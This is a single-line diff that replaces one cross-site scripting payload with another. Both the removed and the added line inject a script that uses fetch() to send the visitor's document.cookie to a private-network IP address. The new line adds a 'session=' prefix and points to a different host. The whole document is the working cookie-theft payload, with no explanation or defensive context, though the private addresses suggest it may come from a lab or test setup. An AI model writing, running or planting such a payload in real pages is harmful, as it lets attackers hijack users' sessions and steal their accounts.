@@ -1,1 +1,1 @@
-<script>fetch('http://192.168.154.128/.'+document.cookie)</script>
+<script>fetch("http://10.42.70.198/.session="+document.cookie);</script>
